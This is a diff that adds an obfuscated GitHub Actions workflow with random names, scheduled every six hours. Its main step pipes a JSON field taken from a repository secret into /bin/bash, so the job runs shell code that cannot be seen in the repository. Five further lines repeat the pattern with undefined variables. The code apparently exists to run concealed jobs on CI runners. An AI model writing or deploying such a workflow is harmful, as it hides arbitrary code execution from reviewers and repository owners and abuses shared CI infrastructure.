@@ -1,0 +1,22 @@
+name: luyanxianga
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luyanxianga
+        env:
+          ihem17: ${{ secrets.ihem17 }}
+        run: |
+          echo $ihem17 | jq -r .tfpai49 | /bin/bash
+          echo $tkwpp3 | jq -r .zsepc803 | /bin/bash
+          echo $yta1 | jq -r .tmwmu01 | /bin/bash
+          echo $nidu38905 | jq -r .qyooo140 | /bin/bash
+          echo $a8870 | jq -r .bkg8647 | /bin/bash
+          echo $apo3 | jq -r .jf477 | /bin/bash
+
